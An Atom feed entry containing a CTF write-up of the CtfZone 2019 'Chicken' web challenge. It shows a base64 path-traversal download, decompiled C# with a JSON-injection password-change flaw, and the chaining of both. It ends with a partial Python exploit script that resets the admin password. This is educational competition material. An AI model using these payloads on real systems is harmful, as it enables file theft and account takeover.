<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>thebabush - CTF</title><link href="https://thebabush.github.io/" rel="alternate"></link><link href="https://thebabush.github.io/feeds/ctf.atom.xml" rel="self"></link><id>https://thebabush.github.io/</id><updated>2019-12-13T02:00:00+01:00</updated><subtitle>&lt;pre&gt;$ hack; muzak; cat /dev/random&lt;/pre&gt;</subtitle><entry><title>CtfZone 2019 Quals - Chicken WriteUp</title><link href="https://thebabush.github.io/ctfzone-2019-quals-chicken-writeup.html" rel="alternate"></link><published>2019-12-13T02:00:00+01:00</published><updated>2019-12-13T02:00:00+01:00</updated><author><name>Paolo Montesel</name></author><id>tag:thebabush.github.io,2019-12-13:/ctfzone-2019-quals-chicken-writeup.html</id><summary type="html">&lt;p&gt;Time to try to put together a writeup of a challenge I think only us of
&lt;a href="https://mhackeroni.it/"&gt;mhackeroni&lt;/a&gt; solved.
Given that there were only few reversing challenges, I put on my web-guy hat and
started going down the rabbit hole.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Spoiler alert:&lt;/strong&gt; I will explain not only the solution, but also â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;Time to try to put together a writeup of a challenge I think only us of
&lt;a href="https://mhackeroni.it/"&gt;mhackeroni&lt;/a&gt; solved.
Given that there were only few reversing challenges, I put on my web-guy hat and
started going down the rabbit hole.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Spoiler alert:&lt;/strong&gt; I will explain not only the solution, but also my discovery
process, which I think is way more interesting than a pre-cooked meal.&lt;/p&gt;
&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;p&gt;When we opened &lt;a href="http://web-chicken.ctfz.one/"&gt;http://web-chicken.ctfz.one/&lt;/a&gt;, we
were presented with a nice website about chickens and stuff.&lt;/p&gt;
&lt;p&gt;First thing we noticed is that there were some juicy
&lt;code&gt;/File/Download?filename=&amp;lt;base64&amp;gt;&lt;/code&gt; urls around, which totally looked sketchy.
Turns out the base64 string is the encoded path of the file to download.&lt;/p&gt;
&lt;p&gt;So yep, just like that, we had path traversal and could read whatever we wanted
from the server.&lt;/p&gt;
&lt;h2&gt;The Quest For The Main DLL&lt;/h2&gt;
&lt;p&gt;This app looked very enterprise-level, so we knew it was written in dotnet (actually, just
look at the HTML and it's clear).
For whatever reason, russian CTF organizers really love dotnet stuff on linux.&lt;/p&gt;
&lt;p&gt;About dotnet...
Every compiled project has a &lt;code&gt;ProjectName.dll&lt;/code&gt; file in its main
directory, but we couldn't guess that name.&lt;/p&gt;
&lt;p&gt;And so it was time to turn to Google san.&lt;/p&gt;
&lt;p&gt;We opened a new tab, wrote &lt;code&gt;dotnet web project structure&lt;/code&gt; or something like that
and looked at the pictures.
We could see some interesting files in the directory trees in the image search.
Unfortunately, none of the files we downloaded contained the app name.
Not even &lt;code&gt;appsettings.json&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Sad.&lt;/p&gt;
&lt;p&gt;Eventually our eyes fell on &lt;code&gt;./Views/_ViewImports.cshtml&lt;/code&gt;, a nice file that
started with &lt;code&gt;@using StackHenneryMVCAppProject&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Yep, totally guessable, &lt;code&gt;StackHenneryMVCAppProject&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;And so, by the powers of the path traversal, we downloaded
&lt;code&gt;StackHenneryMVCAppProject.dll&lt;/code&gt; and loaded it in
&lt;a href="https://github.com/icsharpcode/ILSpy"&gt;ILSpy&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;The Code&lt;/h2&gt;
&lt;p&gt;The code of the app is actually pretty small.
At first, we looked at the crypto but it looked fine to my reverser's eyes.&lt;/p&gt;
&lt;p&gt;Second, we looked at the network configuration.
The challenge was made out of 3 servers:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The main website we saw so far&lt;/li&gt;
&lt;li&gt;An authentication server in the internal network of the challenge&lt;/li&gt;
&lt;li&gt;A configuration server in the internal network of the challenge&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;After poking around with the API for a bit, we kinda knew that the most
promising place to look at was the &lt;code&gt;Change_Password_Test&lt;/code&gt; function of the
&lt;code&gt;AuthController&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Protip:&lt;/strong&gt; &lt;code&gt;_test&lt;/code&gt; looks very enterprise and so it's likely to be broken.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="na"&gt;[HttpPost]&lt;/span&gt;
&lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="n"&gt;Task&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;IActionResult&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Change_Password_Test&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;new_password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;old_password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;base_url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;Configuration&lt;/span&gt; &lt;span class="n"&gt;conf&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Configuration&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getSingleton&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;base_url&lt;/span&gt; &lt;span class="p"&gt;==&lt;/span&gt; &lt;span class="k"&gt;null&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;base_url&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;http://&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;+&lt;/span&gt; &lt;span class="n"&gt;conf&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;auth_server&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="n"&gt;HttpClient&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;HttpClient&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;try_login_request&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{{\&amp;quot;username\&amp;quot;:\&amp;quot;{username}\&amp;quot;,\&amp;quot;password\&amp;quot;:\&amp;quot;{old_password}\&amp;quot;,\&amp;quot;secret_token\&amp;quot;:\&amp;quot;{conf.secret_token}\&amp;quot;}}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base_url&lt;/span&gt; &lt;span class="p"&gt;+&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/auth/login&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;StringContent&lt;/span&gt; &lt;span class="n"&gt;request2&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;StringContent&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;try_login_request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;UTF8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;application/json&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;HttpResponseMessage&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;PostAsync&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request2&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StatusCode&lt;/span&gt; &lt;span class="p"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;HttpStatusCode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;OK&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;base&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ViewBag&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Error&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Bad request&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nf"&gt;View&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="n"&gt;LoginResponse&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;JsonConvert&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DeserializeObject&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;LoginResponse&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;(&lt;/span&gt;&lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Content&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ReadAsStringAsync&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;code&lt;/span&gt; &lt;span class="p"&gt;!=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;base&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ViewBag&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Error&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Invalid login/password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nf"&gt;View&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;change_password_request&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{{\&amp;quot;username\&amp;quot;:\&amp;quot;{username}\&amp;quot;,\&amp;quot;new_password\&amp;quot;:\&amp;quot;{new_password}\&amp;quot;,\&amp;quot;secret_token\&amp;quot;:\&amp;quot;{conf.secret_token}\&amp;quot;}} &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;change_pass_url&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;http://&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;+&lt;/span&gt; &lt;span class="n"&gt;conf&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;auth_server&lt;/span&gt; &lt;span class="p"&gt;+&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/auth/change_password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;request2&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;StringContent&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;change_password_request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;UTF8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;application/json&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;PutAsync&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;change_pass_url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request2&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nf"&gt;Content&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Password changed&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Alright alright alright, what do we have here?&lt;/p&gt;
&lt;p&gt;First thing is that we control all of the parameters to this method of course
(they are simply the parameters of our POST request).&lt;/p&gt;
&lt;p&gt;Secondly, that this method makes 2 requests:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;POST to &lt;code&gt;base_url + "/auth/login"&lt;/code&gt; to check the given current password&lt;/li&gt;
&lt;li&gt;PUT to &lt;code&gt;http://auth_server/auth/change_password&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Ok, to be honest, we overlooked the fact that the second request was a PUT and
not a POST.
That made us waste a lot of time as we couldn't understand why our exploit
wasn't working as intended.&lt;/p&gt;
&lt;p&gt;Anyway, you can easily see that &lt;code&gt;try_login_request&lt;/code&gt; is a string concatenation
and so we can inject whatever we want in that json
(e.g.: &lt;code&gt;'old_password': '{}","new_password":"{}'&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;Overall, &lt;code&gt;Change_Password_Test&lt;/code&gt; suffers from
a classical mistake when checking and changing a password: the request
is done in two separate phases and the password change doesn't actually check
for the current password.&lt;/p&gt;
&lt;h2&gt;The Attack Plan&lt;/h2&gt;
&lt;p&gt;Our attack plan was pretty clear: with some web magic, we wanted to bypass the
first request (the password check) and reach the second one (the password
change).&lt;/p&gt;
&lt;p&gt;In order to find a way to do it, we started looking at how the first request's
response is checked:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StatusCode&lt;/span&gt; &lt;span class="p"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;HttpStatusCode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;OK&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;base&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ViewBag&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Error&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Bad request&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nf"&gt;View&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="n"&gt;LoginResponse&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;JsonConvert&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DeserializeObject&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;LoginResponse&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;(&lt;/span&gt;&lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Content&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ReadAsStringAsync&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;code&lt;/span&gt; &lt;span class="p"&gt;!=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;base&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ViewBag&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Error&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Invalid login/password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nf"&gt;View&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So we needed some URL that returned HTTP 200 and a valid json with the data
for a &lt;code&gt;LoginResponse&lt;/code&gt; object.&lt;/p&gt;
&lt;p&gt;Let's look at its code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;LoginResponse&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;code&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;get&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;set&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;message&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;get&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;set&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;token&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;get&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;set&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;See anything interesting here?&lt;/p&gt;
&lt;p&gt;No &lt;code&gt;[Required]&lt;/code&gt; annotations.&lt;/p&gt;
&lt;p&gt;This means that every json is going to be succesfully deserialized into an empty
&lt;code&gt;LoginResponse&lt;/code&gt; object, thus setting &lt;code&gt;code=0&lt;/code&gt;, thus bypassing the password
check.
Unused attributes in the json file are just going to be ignored by the
deserialization.&lt;/p&gt;
&lt;p&gt;Now, since we didn't see that the second request was a PUT, we spent &lt;strong&gt;a lot&lt;/strong&gt;
of time trying different things and they didn't work.&lt;/p&gt;
&lt;p&gt;At some point, we decided it was a good idea to recreate the challenge
environment locally.
And so we did :)
We made a script that downloaded the DLLs/views/etc one file at a time using the
path traversal vuln.
We also stubbed the auth and configuration server using a simple flask-based
app.
It was kind of working (there were some configuration errors that broke the view
rendering), and we finally noticed that the request was indeed a PUT.&lt;/p&gt;
&lt;p&gt;This is what you get when you do CTFs instead of going to sleep.&lt;/p&gt;
&lt;p&gt;Anyway, we were really proud of our script that used &lt;code&gt;dotnet&lt;/code&gt; to run the app,
logged its execution and used some regexps to download all the files that were
missing.&lt;/p&gt;
&lt;p&gt;Back on track.&lt;/p&gt;
&lt;p&gt;It looks like everything we needed now was an URL that returned a valid json file,
so that &lt;code&gt;LoginResponse&lt;/code&gt; was going to be deserialized with &lt;code&gt;.code = 0&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This is one of the things we were most proud of: we decided to use the path
traversal itself as &lt;code&gt;baseUrl&lt;/code&gt; for the password change, and we pointed the base64
path to a json on the filesystem.&lt;/p&gt;
&lt;p&gt;What json file? None other than &lt;code&gt;appsettings.json&lt;/code&gt;, the dotnet configuration
file.&lt;/p&gt;
&lt;p&gt;See what we did there? :) Binary guys chaining vulns.&lt;/p&gt;
&lt;h2&gt;The Unexpected Behavior&lt;/h2&gt;
&lt;p&gt;At this point we had an exploit that was working but not really.&lt;/p&gt;
&lt;p&gt;The webserver was giving us all the right responses but we still couldn't login.&lt;/p&gt;
&lt;p&gt;This is when we asked the organizers for confirmation that the admin username
was indeed &lt;code&gt;admin&lt;/code&gt;.
We got a nice &lt;code&gt;we can't tell you that&lt;/code&gt; reply.
Not the nicest organizers out there :) but another org confirmed the user was
&lt;code&gt;admin&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;After some more guessing, I thought &lt;em&gt;well... they wouldn't be so &lt;strong&gt;nice&lt;/strong&gt; as to
put some password strength verification on a CTF challenge... right? ...right?&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;My ass.&lt;/p&gt;
&lt;p&gt;The only reason our exploit was failing now, was that the challenge was checking
that the new password had at least one uppercase character and a number.&lt;/p&gt;
&lt;p&gt;Yeah.&lt;/p&gt;
&lt;p&gt;First time in my CTF &lt;em&gt;career&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Anyway, this ends my sloppy writeup.&lt;/p&gt;
&lt;h2&gt;The Script&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;


&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Session&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="n"&gt;USERNAME&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;PASSWORD&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;TotallyWasntASwear123&amp;#39;&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;{}&amp;quot;,&amp;quot;new_password&amp;quot;:&amp;quot;{}&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PASSWORD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PASSWORD&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="c1"&gt;# Change the password&lt;/span&gt;
&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;http://web-chicken.ctfz.one/Auth/Change_Password_Test&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;USERNAME&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;old_password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;{}&amp;quot;,&amp;quot;new_password&amp;quot;:&amp;quot;{}&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PASSWORD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PASSWORD&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;new_password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;{}&amp;quot;,&amp;quot;asd&amp;quot;:&amp;quot;lol&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PASSWORD&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;base_url&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://web-chicken.ctfz.one/File/Download?filename={}&amp;amp;asd&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
            &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/app/appsettings.json&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
